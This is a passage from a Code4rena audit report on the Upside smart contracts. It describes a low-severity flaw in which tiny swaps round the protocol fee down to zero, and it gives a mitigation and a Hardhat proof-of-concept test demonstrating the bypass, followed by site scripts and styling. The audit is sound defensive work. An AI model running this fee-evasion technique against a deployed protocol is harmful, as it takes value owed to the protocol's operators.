<p>The <code>swap()</code> function in the <code>UpsideProtocol</code> smart contract is vulnerable to fee circumvention when users initiate swaps with extremely small input amounts. The issue stems from the use of integer division in Solidity, which truncates values. As a result, when the calculated fee amount is less than 1 (due to the small trade size), it truncates to zero, effectively bypassing the protocol’s fee logic.</p>
<pre data-index="7" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">       </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">_isBuy</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// @dev On buy, the dynamic time fee is used</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">fee</span><span class="mtk1"> = (</span><span class="mtk12">_tokenAmount</span><span class="mtk1"> * </span><span class="mtk12">swapFeeBp</span><span class="mtk1">) / </span><span class="mtk7">10000</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">tokenAmountAfterFee</span><span class="mtk1"> = </span><span class="mtk12">_tokenAmount</span><span class="mtk1"> - </span><span class="mtk12">fee</span><span class="mtk1">;</span></span></span></code></pre>
<p>This behavior directly undermines the intended fee model, allowing users to perform token swaps without contributing any fee to the protocol. The bypass is particularly problematic given the economic incentives it creates—users could automate micro-swaps to avoid fees entirely while still draining value from the system.</p>
<h3 style="position:relative;" id="impact-1"><a class="anchor before" aria-label="impact 1 permalink" href="https://code4rena.com/reports/2025-05-upside#impact-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>No fees are collected on small trade size.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-2"><a class="anchor before" aria-label="recommended mitigation steps 2 permalink" href="https://code4rena.com/reports/2025-05-upside#recommended-mitigation-steps-2"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Set a protocol-wide minimum input amount to reject trades too small to generate fees:</p>
<pre data-index="8" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+   require(_amount &gt;= MIN_SWAP_AMOUNT, "Swap amount too small");</span></span></span></code></pre>
<h3 style="position:relative;" id="proof-of-concept-2"><a class="anchor before" aria-label="proof of concept 2 permalink" href="https://code4rena.com/reports/2025-05-upside#proof-of-concept-2"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of concept</h3>
<ol>
<li>In <code>PoC.test.ts</code>, make the following modification:</li>
</ol>
<pre data-index="9" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    import { ethers as hhethers } from "hardhat";</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    import {IERC20Metadata, UpsideMetaCoin, UpsideProtocol, UpsideStakingStub} from "../types";</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    // Add this import</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+   import { expect } from "chai";</span></span></span></code></pre>
<ol start="2">
<li>Add the following test in <code>PoC.test.ts</code>:</li>
</ol>
<pre data-index="10" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">  it("should implement fee exemption for user1 during swap", async function () {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const tokenizeFeeDestinationAddress = await owner.getAddress();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const _mintAmount = hhethers.parseUnits("100", 6);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Set up a initial swap fee configuration</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const newFeeInfo = {</span></span>
<span class="grvsc-line"><span class="grvsc-source">      tokenizeFeeEnabled: true,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      tokenizeFeeDestinationAddress: tokenizeFeeDestinationAddress,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeStartingBp: 100,  // 10%</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeDecayBp: 100,      // 1%</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeDecayInterval: 6,  // 6 seconds</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeFinalBp: 90,      // 0.9%</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeDeployerBp: 1000,  // 10%</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeSellBp: 100,       // 1%</span></span>
<span class="grvsc-line"><span class="grvsc-source">    };</span></span>
<span class="grvsc-line"><span class="grvsc-source">  </span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Set fee info:</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await upsideProtocol.connect(owner).setFeeInfo(newFeeInfo);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    </span></span>
<span class="grvsc-line"><span class="grvsc-source">    // mint user1 with liquidityToken</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await liquidityToken.mint(await user1.getAddress(), _mintAmount);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Verify user1 received the correct liquidity token balance</span></span>
<span class="grvsc-line"><span class="grvsc-source">    let user1LiquidityTokenBalance = await liquidityToken.balanceOf(await user1.getAddress());</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(user1LiquidityTokenBalance).to.be.eq(_mintAmount);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Perform a swap with an extremely small input amount</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const _tokenAmount = hhethers.parseUnits("0.000099", 6);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await liquidityToken.connect(user1).approve(await upsideProtocol.getAddress(), _tokenAmount);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await upsideProtocol.connect(user1).swap(</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await sampleLinkToken.getAddress(),</span></span>
<span class="grvsc-line"><span class="grvsc-source">      true,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      _tokenAmount,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      0,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      await user1.getAddress()</span></span>
<span class="grvsc-line"><span class="grvsc-source">    );</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // assert that user1 receives a non-zero amount of LINK tokens</span></span>
<span class="grvsc-line"><span class="grvsc-source">    let user1LinkTokenBalance = await sampleLinkToken.balanceOf(await user1.getAddress());</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(user1LinkTokenBalance).to.be.gt(0);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Check that no protocol fees were collected from the swap</span></span>
<span class="grvsc-line"><span class="grvsc-source">    let claimableProtocolFees = await upsideProtocol.claimableProtocolFees();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(claimableProtocolFees).to.be.eq(0); // Fee bypass confirmed</span></span>
<span class="grvsc-line"><span class="grvsc-source">  });</span></span></code></pre>
<p><em>Note: QA report issues deemed invalid by the judge have been removed for reporting purposes.</em></p>
<hr>
<h1 style="position:relative;" id="disclosures"><a class="anchor before" aria-label="disclosures permalink" href="https://code4rena.com/reports/2025-05-upside#disclosures"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Disclosures</h1>
<p>C4 is an open organization governed by participants in the community.</p>
<p>C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>
<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>
<style class="grvsc-styles">
  .grvsc-container {
    overflow: auto;
    position: relative;
    -webkit-overflow-scrolling: touch;
    padding-top: 1rem;
    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));
    padding-bottom: 1rem;
    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));
    border-radius: 8px;
    border-radius: var(--grvsc-border-radius, 8px);
    font-feature-settings: normal;
    line-height: 1.4;
  }
  
  .grvsc-code {
    display: table;
  }
  
  .grvsc-line {
    display: table-row;
    box-sizing: border-box;
    width: 100%;
    position: relative;
  }
  
  .grvsc-line > * {
    position: relative;
  }
  
  .grvsc-gutter-pad {
    display: table-cell;
    padding-left: 0.75rem;
    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);
  }
  
  .grvsc-gutter {
    display: table-cell;
    -webkit-user-select: none;
    -moz-user-select: none;
    user-select: none;
  }
  
  .grvsc-gutter::before {
    content: attr(data-content);
  }
  
  .grvsc-source {
    display: table-cell;
    padding-left: 1.5rem;
    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));
    padding-right: 1.5rem;
    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));
  }
  
  .grvsc-source:empty::after {
    content: ' ';
    -webkit-user-select: none;
    -moz-user-select: none;
    user-select: none;
  }
  
  .grvsc-gutter + .grvsc-source {
    padding-left: 0.75rem;
    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);
  }
  
  /* Line transformer styles */
  
  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {
    content: ' ';
    position: absolute;
    width: 100%;
  }
  
  .grvsc-line-diff-add::before {
    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));
  }
  
  .grvsc-line-diff-del::before {
    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));
  }
  
  .grvsc-line-number {
    padding: 0 2px;
    text-align: right;
    opacity: 0.7;
  }
  
  .dark-default-dark {
    background-color: #1E1E1E;
    color: #D4D4D4;
  }
  .dark-default-dark .mtk1 { color: #D4D4D4; }
  .dark-default-dark .mtk12 { color: #9CDCFE; }
  .dark-default-dark .mtk15 { color: #C586C0; }
  .dark-default-dark .mtk11 { color: #DCDCAA; }
  .dark-default-dark .mtk7 { color: #B5CEA8; }
  .dark-default-dark .mtk8 { color: #CE9178; }
  .dark-default-dark .mtk4 { color: #569CD6; }
  .dark-default-dark .mtk3 { color: #6A9955; }
  .dark-default-dark .grvsc-line-highlighted::before {
    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));
    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));
  }
</style></div></div><div class="core-app-report__sidebar"><div class="core-app-report__toc"><div class="core-app-report__toc-header"><h1 class="core-app-report__toc-title">Table of contents</h1><svg class="core-app-report__toc-arrow " width="24" height="25" viewBox="0 0 24 25" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M19 9.5L12 16.5L5 9.5" stroke="#ADABB2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg></div></div></div></div></div></main></div></div><script src="./Upside_files/webpack-ee83ff9cf0b0c89c.js.download" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([2,null])</script><script>self.__next_f.push([1,"1:HL[\"/_next/static/media/9b7eb431f23ca42e-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n2:HL[\"/_next/static/media/b603571150b520e0-s.p.ttf\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/ttf\"}]\n3:HL[\"/_next/static/media/d9396795aa5ec363-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n4:HL[\"/_next/static/css/aa1e03632b0a9f00.css\",\"style\"]\n5:HL[\"/_next/static/css/2c612863d5a616cb.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"6:I[12846,[],\"\"]\n9:I[4707,[],\"\"]\nb:I[36423,[],\"\"]\nc:I[15718,[\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"3211\",\"static/chunks/app/reports/error-337d8165658cb655.js\"],\"default\"]\nf:I[61060,[],\"\"]\na:[\"slug\",\"2025-05-upside\",\"d\"]\n10:[]\n0:[\"$\",\"$L6\",null,{\"buildId\":\"GcxK7sNbw6COX75T-g0fs\",\"assetPrefix\":\"\",\"urlParts\":[\"\",\"reports\",\"2025-05-upside\"],\"initialTree\":[\"\",{\"children\":[\"reports\",{\"children\":[[\"slug\",\"2025-05-upside\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],\"initialSeedData\":[\"\",{\"children\":[\"reports\",{\"children\":[[\"slug\",\"2025-05-upside\",\"d\"],{\"children\":[\"__PAGE__\",{},[[\"$L7\",\"$L8\",null],null],null]},[null,[\"$\",\"$L9\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"reports\",\"children\",\"$a\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\"}]],null]},[null,[\"$\",\"$L9\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"reports\",\"children\"],\"error\":\"$c\",\"errorStyles\":[],\"errorScripts\":[],\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\"}]],null]},[[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/aa1e03632b0a9f00.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/2c612863d5a616cb.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\"}]],\"$Ld\"],null],null],\"couldBeIntercepted\":false,\"initialHead\":[null,\"$Le\"],\"globalErrorComponent\":\"$f\",\"missingSlots\":\"$W10\"}]\n"])</script><script>self.__next_f.push([1,"11:I[36525,[\"8550\",\"static/chunks/da2599a7-883aa94cd391c09d.js\",\"8218\",\"static/chunks/aaea2bcf-7a609d2a8547b978.js\",\"5501\",\"static/chunks/c16f53c3-1c73b34d2bc72b67.js\",\"5986\",\"static/chunks/0815f603-89dbad4b5756c5c4.js\",\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"1700\",\"static/chunks/1700-bbc1d97db9b9492c.js\",\"2636\",\"static/chunks/2636-173262633c516a97.js\",\"3504\",\"static/chunks/3504-22e800882144201d.js\",\"4105\",\"static/chunks/4105-30871074ad2edc9d.js\",\"6390\",\"static/chunks/6390-77d8d06791482011.js\",\"6686\",\"static/chunks/6686-dd6382cfde9e8708.js\",\"5813\",\"static/chunks/5813-7499623caf5cc29b.js\",\"1638\",\"static/chunks/1638-db2c32ae38fcd41e.js\",\"191\",\"static/chunks/191-92b4f6645071a623.js\",\"5028\",\"static/chunks/5028-123aa2d0fc9289a2.js\",\"867\",\"static/chunks/867-d827a4f529ecb777.js\",\"7834\",\"static/chunks/7834-2536a8f829bd1d9d.js\",\"3185\",\"static/chunks/app/layout-c054eff4d03ebbf2.js\"],\"default\"]\n12:I[75292,[\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"9160\",\"static/chunks/app/not-found-c0beac80bd3674ca.js\"],\"default\"]\n13:I[80319,[\"8550\",\"static/chunks/da2599a7-883aa94cd391c09d.js\",\"8218\",\"static/chunks/aaea2bcf-7a609d2a8547b978.js\",\"5501\",\"static/chunks/c16f53c3-1c73b34d2bc72b67.js\",\"5986\",\"static/chunks/0815f603-89dbad4b5756c5c4.js\",\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"1700\",\"static/chunks/1700-bbc1d97db9b9492c.js\",\"2636\",\"static/chunks/2636-173262633c516a97.js\",\"3504\",\"static/chunks/3504-22e800882144201d.js\",\"4105\",\"static/chunks/4105-30871074ad2edc9d.js\",\"6390\",\"static/chunks/6390-77d8d06791482011.js\",\"1638\",\"static/chunks/1638-db2c32ae38fcd41e.js\",\"191\",\"static/chunks/191-92b4f6645071a623.js\",\"5028\",\"static/chunks/5028-123aa2d0fc9289a2.js\",\"867\",\"static/chunks/867-d827a4f529ecb777.js\",\"7834\",\"static/chunks/7834-2536a8f829bd1d9d.js\",\"1960\",\"static/chunks/app/reports/%5Bslug%5D/page-220cafabfbe0a147.js\"],\"default\"]\n14:I[39350,[\"8550\",\"static/chunks/da2599a7-883aa94cd391c09d.js\",\"8218\",\"static/chunks/aaea"])</script><script>self.__next_f.push([1,"2bcf-7a609d2a8547b978.js\",\"5501\",\"static/chunks/c16f53c3-1c73b34d2bc72b67.js\",\"5986\",\"static/chunks/0815f603-89dbad4b5756c5c4.js\",\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"1700\",\"static/chunks/1700-bbc1d97db9b9492c.js\",\"2636\",\"static/chunks/2636-173262633c516a97.js\",\"3504\",\"static/chunks/3504-22e800882144201d.js\",\"4105\",\"static/chunks/4105-30871074ad2edc9d.js\",\"6390\",\"static/chunks/6390-77d8d06791482011.js\",\"1638\",\"static/chunks/1638-db2c32ae38fcd41e.js\",\"191\",\"static/chunks/191-92b4f6645071a623.js\",\"5028\",\"static/chunks/5028-123aa2d0fc9289a2.js\",\"867\",\"static/chunks/867-d827a4f529ecb777.js\",\"7834\",\"static/chunks/7834-2536a8f829bd1d9d.js\",\"1960\",\"static/chunks/app/reports/%5Bslug%5D/page-220cafabfbe0a147.js\"],\"default\"]\n16:I[75899,[\"8550\",\"static/chunks/da2599a7-883aa94cd391c09d.js\",\"8218\",\"static/chunks/aaea2bcf-7a609d2a8547b978.js\",\"5501\",\"static/chunks/c16f53c3-1c73b34d2bc72b67.js\",\"5986\",\"static/chunks/0815f603-89dbad4b5756c5c4.js\",\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"1700\",\"static/chunks/1700-bbc1d97db9b9492c.js\",\"2636\",\"static/chunks/2636-173262633c516a97.js\",\"3504\",\"static/chunks/3504-22e800882144201d.js\",\"4105\",\"static/chunks/4105-30871074ad2edc9d.js\",\"6390\",\"static/chunks/6390-77d8d06791482011.js\",\"1638\",\"static/chunks/1638-db2c32ae38fcd41e.js\",\"191\",\"static/chunks/191-92b4f6645071a623.js\",\"5028\",\"static/chunks/5028-123aa2d0fc9289a2.js\",\"867\",\"static/chunks/867-d827a4f529ecb777.js\",\"7834\",\"static/chunks/7834-2536a8f829bd1d9d.js\",\"1960\",\"static/chunks/app/reports/%5Bslug%5D/page-220cafabfbe0a147.js\"],\"default\"]\nd:[\"$\",\"html\",null,{\"lang\":\"en\",\"className\":\"dark __variable_145019 __variable_7d3254 __variable_38ceec\",\"children\":[\"$\",\"body\",null,{\"children\":[\"$\",\"$L11\",null,{\"hasLoginHistory\":true,\"children\":[\"$\",\"$L9\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Lb\",null,{}],\"template"])</script><script>self.__next_f.push([1,"Styles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[\"$\",\"$L12\",null,{}],\"notFoundStyles\":[]}]}]}]}]\n15:Tefe9,"])</script><script>self.__next_f.push([1,"\u003ch1 id=\"overview\" style=\"position:relative;\"\u003e\u003ca href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eOverview\u003c/h1\u003e\n\u003ch2 id=\"about-c4\" style=\"position:relative;\"\u003e\u003ca href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eAbout C4\u003c/h2\u003e\n\u003cp\u003eCode4rena (C4) is a competitive audit platform where security researchers, referred to as Wardens, review, audit, and analyze codebases for security vulnerabilities in exchange for bounties provided by sponsoring projects.\u003c/p\u003e\n\u003cp\u003eA C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\u003c/p\u003e\n\u003cp\u003eDuring the audit outlined in this document, C4 conducted an analysis of the Upside smart contract system. The audit took place from May 19 to May 26, 2025.\u003c/p\u003e\n\u003cp\u003eFinal report assembled by Code4rena.\u003c/p\u003e\n\u003ch1 id=\"summary\" style=\"position:relative;\"\u003e\u003ca href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSummary\u003c/h1\u003e\n\u003cp\u003eThe C4 analysis yielded an aggregated total of 0 High and Medium vulnerabilities. Additionally, C4 analysis included 27 reports detailing issues with a risk rating of LOW severity or non-critical. \u003c/p\u003e\n\u003cp\u003eAll of the issues presented here are linked back to their original finding, which may include relevant context from the judge and Upside team.\u003c/p\u003e\n\u003ch1 id=\"scope\" style=\"position:relative;\"\u003e\u003ca href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eScope\u003c/h1\u003e\n\u003cp\u003eThe code under review can be found within the \u003ca href=\"https://github.com/code-423n4/2025-05-upside\"\u003eC4 Upside repository\u003c/a\u003e, and is composed of 2 smart contracts written in the Solidity programming language and includes 379 lines of Solidity code.\u003c/p\u003e\n\u003ch1 id=\"severity-criteria\" style=\"position:relative;\"\u003e\u003ca href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eSeverity Criteria\u003c/h1\u003e\n\u003cp\u003eC4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.\u003c/p\u003e\n\u003cp\u003eHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMalicious Input Handling\u003c/li\u003e\n\u003cli\u003eEscalation of privileges\u003c/li\u003e\n\u003cli\u003eArithmetic\u003c/li\u003e\n\u003cli\u003eGas use\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eFor more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on \u003ca href=\"https://code4rena.com\"\u003ethe C4 website\u003c/a\u003e, specifically our section on \u003ca 